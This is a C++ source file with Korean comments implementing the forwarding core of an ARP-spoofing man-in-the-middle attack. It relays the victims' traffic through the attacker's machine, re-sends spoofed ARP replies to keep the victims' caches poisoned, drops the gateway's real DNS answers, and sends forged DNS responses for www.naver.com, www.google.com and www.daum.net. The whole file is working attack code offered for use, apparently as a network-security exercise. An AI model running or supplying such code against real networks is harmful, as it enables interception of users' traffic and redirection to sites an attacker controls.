#include "packet_forwarder.hpp"
#include "dns_spoof.hpp"
#include <iostream>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <string.h>
#include <chrono>

using namespace std;
using namespace std::chrono;

#define DNS_PORT 53

// DNS 요청 큐 - 이미 처리한 요청 추적
struct DnsRequest {
    u_int16_t id;             // 트랜잭션 ID
    string domain;            // 요청 도메인
    uint16_t qtype;           // 쿼리 타입
    high_resolution_clock::time_point timestamp;  // 요청 시간
};

// 최근 처리한 DNS 요청 추적을 위한 배열
const int MAX_DNS_HISTORY = 256;  // 추적할 최대 요청 수
DnsRequest recent_dns_requests[MAX_DNS_HISTORY];
int dns_history_index = 0;

PacketForwarder::PacketForwarder(pcap_t* handle, ArpSpoofer* spoofer)
    : handle(handle), spoofer(spoofer), running(false) {}

PacketForwarder::~PacketForwarder() {
    stop();
}

void PacketForwarder::start() 
{
    if (running)
        return;
    running = true;
    
    // 최근 처리한 DNS 요청 초기화
    memset(recent_dns_requests, 0, sizeof(recent_dns_requests));
    dns_history_index = 0;
    
    forward_thread = make_unique<thread>(&PacketForwarder::forward_loop, this);
}

void PacketForwarder::stop() 
{
    running = false;
    cv.notify_all();
    if (forward_thread && forward_thread->joinable())
        forward_thread->join();
}

void PacketForwarder::forward_loop() 
{
    cout << "패킷 포워딩 시작됨.\n";
    struct pcap_pkthdr* header;
    const u_int8_t* packet_data;
    int res;
    
    // 패킷 캡처 루프 최적화
    while (running) {
        res = pcap_next_ex(handle, &header, &packet_data);
        if (res == 0) {
            this_thread::sleep_for(chrono::microseconds(10));  // 타임아웃 시간 단축
            continue;
        } else if (res < 0) {
            cerr << "패킷 캡처 오류: " << pcap_geterr(handle) << "\n";
            break;
        }
        
        struct ether_header* eth = (struct ether_header*)packet_data;
        
        // ARP 패킷 처리
        if (ntohs(eth->ether_type) == ETHERTYPE_ARP) {
            handle_arp_packet(packet_data, header->len);
            continue;
        }
        
        // IP 패킷 처리
        if (ntohs(eth->ether_type) == ETHERTYPE_IP && is_spoofed_packet(packet_data, header->len)) {
            struct ip_header* ip = (struct ip_header*)(packet_data + sizeof(struct ether_header));
            
            // **중요: 먼저 DNS 패킷인지 확인하고 선제적으로 처리**
            if (ip->ip_p == IPPROTO_UDP) {
                int ip_header_len = (ip->ip_vhl & 0x0f) * 4;
                udp_header* udp = (udp_header*)(packet_data + sizeof(struct ether_header) + ip_header_len);
                u_int16_t sport = ntohs(udp->uh_sport);
                u_int16_t dport = ntohs(udp->uh_dport);
                
                u_int8_t src_ip[4], dst_ip[4];
                memcpy(src_ip, &ip->ip_src, 4);
                memcpy(dst_ip, &ip->ip_dst, 4);
                
                // 1. 게이트웨이의 DNS 응답 패킷 차단
                if (sport == DNS_PORT && ip_equals(src_ip, spoofer->get_gateway_ip())) {
                    auto dns_start = high_resolution_clock::now();
                    
                    // DNS 응답 패킷 분석
                    dns_header* dns_hdr = (dns_header*)(packet_data + sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));
                    u_int16_t dns_id = ntohs(dns_hdr->id);
                    
                    // 우리가 처리한 요청에 대한 응답인지 확인
                    bool is_our_request = false;
                    for (int i = 0; i < MAX_DNS_HISTORY; i++) {
                        if (recent_dns_requests[i].id == dns_id && 
                            (high_resolution_clock::now() - recent_dns_requests[i].timestamp) < seconds(5)) {
                            is_our_request = true;
                            break;
                        }
                    }
                    
                    if (is_our_request) {
                        cout << "게이트웨이 DNS 응답 차단 (TxID: 0x" << hex << dns_id << dec << ")\n";
                    } else {
                        cout << "알 수 없는 DNS 응답 차단 (TxID: 0x" << hex << dns_id << dec << ")\n";
                    }
                    
                    auto dns_end = high_resolution_clock::now();
                    auto duration = duration_cast<microseconds>(dns_end - dns_start).count();
                    cout << "DNS 응답 처리 시간: " << duration << "μs\n";
                    
                    continue;  // 패킷 전달하지 않고 다음 패킷으로
                }
                
                // 2. 클라이언트의 DNS 요청 처리
                if (dport == DNS_PORT && !ip_equals(src_ip, spoofer->get_gateway_ip())) {
                    auto dns_start = high_resolution_clock::now();
                    
                    // DNS 요청 분석
                    dns_header* dns_hdr = (dns_header*)(packet_data + sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));
                    u_int16_t dns_id = ntohs(dns_hdr->id);
                    
                    // 도메인 추출
                    uint8_t* dns_ptr = (uint8_t*)(packet_data + sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));
                    size_t dns_len = header->len - (sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));
                    string domain = extract_domain_name(dns_ptr, dns_len);
                    
                    // 쿼리 타입 확인
                    uint8_t* qptr = dns_ptr + sizeof(dns_header);
                    while (*qptr != 0 && (qptr - dns_ptr) < dns_len) qptr += (*qptr) + 1;
                    qptr++;  // null 바이트 건너뛰기
                    uint16_t qtype = ntohs(*(uint16_t*)qptr);
                    
                    cout << "DNS 요청 감지: " << domain << " (TxID: 0x" << hex << dns_id << dec 
                         << ", Type: " << qtype << ") - " << ip_to_string(src_ip) << "\n";
                    
                    // 이미 처리한 요청인지 확인
                    bool already_processed = false;
                    for (int i = 0; i < MAX_DNS_HISTORY; i++) {
                        if (recent_dns_requests[i].id == dns_id && 
                            recent_dns_requests[i].domain == domain &&
                            (high_resolution_clock::now() - recent_dns_requests[i].timestamp) < seconds(5)) {
                            already_processed = true;
                            break;
                        }
                    }
                    
                    if (!already_processed) {
                        // 요청 기록에 추가
                        recent_dns_requests[dns_history_index].id = dns_id;
                        recent_dns_requests[dns_history_index].domain = domain;
                        recent_dns_requests[dns_history_index].qtype = qtype;
                        recent_dns_requests[dns_history_index].timestamp = high_resolution_clock::now();
                        dns_history_index = (dns_history_index + 1) % MAX_DNS_HISTORY;
                        
                        // 스푸핑 대상 도메인인지 확인
                        bool should_spoof = (domain.find("www.naver.com") != string::npos || 
                                             domain.find("www.google.com") != string::npos || 
                                             domain.find("www.daum.net") != string::npos);
                        
                        if (should_spoof) {
                            // 원본 패킷 복사
                            u_int8_t* packet_copy = new u_int8_t[header->len];
                            memcpy(packet_copy, packet_data, header->len);
                            
                            // DNS 응답 스푸핑 - 요청을 포워딩하지 않고 직접 응답
                            send_dns_spoof_response(handle, packet_copy, header->len,
                                spoofer->get_attacker_mac(), spoofer->get_gateway_ip(),
                                domain, spoofer->get_targets());
                            
                            // 메모리 해제
                            delete[] packet_copy;
                            
                            auto dns_end = high_resolution_clock::now();
                            auto duration = duration_cast<microseconds>(dns_end - dns_start).count();
                            cout << "DNS 스푸핑 처리 시간: " << duration << "μs\n";
                            
                            // 원본 DNS 요청은 게이트웨이로 포워딩하지 않음
                            cout << "원본 DNS 요청 차단: " << domain << " (TxID: 0x" << hex << dns_id << dec << ")\n";
                            continue;  // 다음 패킷으로
                        }
                    } else {
                        cout << "이미 처리된 DNS 요청 무시\n";
                    }
                }
            }
            
            // DNS 패킷이 아니거나 스푸핑 대상이 아닌 경우 정상 포워딩
            forward_packet(packet_data, header->len);
        }
    }
    cout << "패킷 포워딩 중지됨.\n";
}

void PacketForwarder::handle_arp_packet(const u_int8_t* packet_data, size_t packet_len) {
    struct ether_header* eth = (struct ether_header*)packet_data;
    struct arp_header* arp = (struct arp_header*)(packet_data + sizeof(struct ether_header));

    const u_int8_t* sender_ip = arp->spa;
    const u_int8_t* target_ip = arp->tpa;

    // gateway 또는 target IP로의 ARP 요청인지 확인
    bool involves_gateway = ip_equals(sender_ip, spoofer->get_gateway_ip()) || ip_equals(target_ip, spoofer->get_gateway_ip());
    bool involves_target = false;

    for (const auto& target : spoofer->get_targets()) {
        if (ip_equals(sender_ip, target->get_ip()) || ip_equals(target_ip, target->get_ip())) {
            involves_target = true;
            break;
        }
    }

    if (involves_gateway && involves_target) {
        cout << "[ARP 요청] 게이트웨이 <-> 타겟 간 ARP 요청 감지. DROP & 스푸핑 ARP 재전송.\n";
        for (const auto& target : spoofer->get_targets()) {
            spoofer->send_arp_spoofing_packet(target.get());
        }
    }
}

// 공격 대상 IP의 통신인지 확인
bool PacketForwarder::is_spoofed_packet(const u_int8_t* packet_data, size_t packet_len)
{
    if (packet_len < sizeof(struct ether_header) + sizeof(struct ip_header))
    {
        return false;
    }
    struct ether_header* eth = (struct ether_header*)packet_data;
    if (ntohs(eth->ether_type) != ETHERTYPE_IP)
    {
        return false;
    }
    
    struct ip_header* ip = (struct ip_header*)(packet_data + sizeof(struct ether_header));
    u_int8_t src_ip[4], dst_ip[4];
    memcpy(src_ip, &ip->ip_src, 4);
    memcpy(dst_ip, &ip->ip_dst, 4);

    bool src_is_target = false, dst_is_target = false;
    bool src_is_gateway = ip_equals(src_ip, spoofer->get_gateway_ip());
    bool dst_is_gateway = ip_equals(dst_ip, spoofer->get_gateway_ip());
    for (const auto& target : spoofer->get_targets()) 
    {
        if (ip_equals(src_ip, target->get_ip()))
        {
            src_is_target = true;
        }
        if (ip_equals(dst_ip, target->get_ip()))
        {
            dst_is_target = true;
        }
    }
    return (src_is_target && dst_is_gateway) || (src_is_gateway && dst_is_target);
}

// 패킷 포워딩 함수 (DNS가 아닌 일반 패킷만 처리)
void PacketForwarder::forward_packet(const u_int8_t* packet_data, size_t packet_len) 
{
    u_int8_t* new_packet = new u_int8_t[packet_len];
    memcpy(new_packet, packet_data, packet_len);
    struct ether_header* eth = (struct ether_header*)new_packet;
    struct ip_header* ip = (struct ip_header*)(new_packet + sizeof(struct ether_header));
    u_int8_t src_ip[4], dst_ip[4];
    memcpy(src_ip, &ip->ip_src, 4);
    memcpy(dst_ip, &ip->ip_dst, 4);

    // MAC 주소 설정
    if (ip_equals(src_ip, spoofer->get_gateway_ip())) 
    {
        memcpy(eth->ether_shost, spoofer->get_attacker_mac(), 6);
        bool found = false;
        for (const auto& target : spoofer->get_targets()) 
        {
            if (ip_equals(dst_ip, target->get_ip())) 
            {
                memcpy(eth->ether_dhost, target->get_mac(), 6);
                found = true;
                break;
            }
        }
        if (!found) 
        {
            delete[] new_packet;
            return;
        }
    }  
    else 
    {
        memcpy(eth->ether_shost, spoofer->get_attacker_mac(), 6);
        memcpy(eth->ether_dhost, spoofer->get_gateway_mac(), 6);
    }

    // 일반 포워딩
    if (mac_equals(eth->ether_dhost, ZERO_MAC)) 
    {
        cout << "목적지 MAC 주소가 설정되지 않았습니다. 패킷을 전달하지 않습니다." << endl;
    } 
    else 
    {
        auto forward_start = high_resolution_clock::now();
        
        if (pcap_sendpacket(handle, new_packet, packet_len) != 0)
            cerr << "패킷 포워딩 실패: " << pcap_geterr(handle) << "\n";
        
        auto forward_end = high_resolution_clock::now();
        auto duration = duration_cast<microseconds>(forward_end - forward_start).count();
        
        // 디버깅이 필요할 때만 활성화
        // cout << "패킷 포워딩 완료: " << ip_to_string(src_ip) << " -> " << ip_to_string(dst_ip) 
        //      << " (" << duration << "μs)\n";
    }

    delete[] new_packet;
}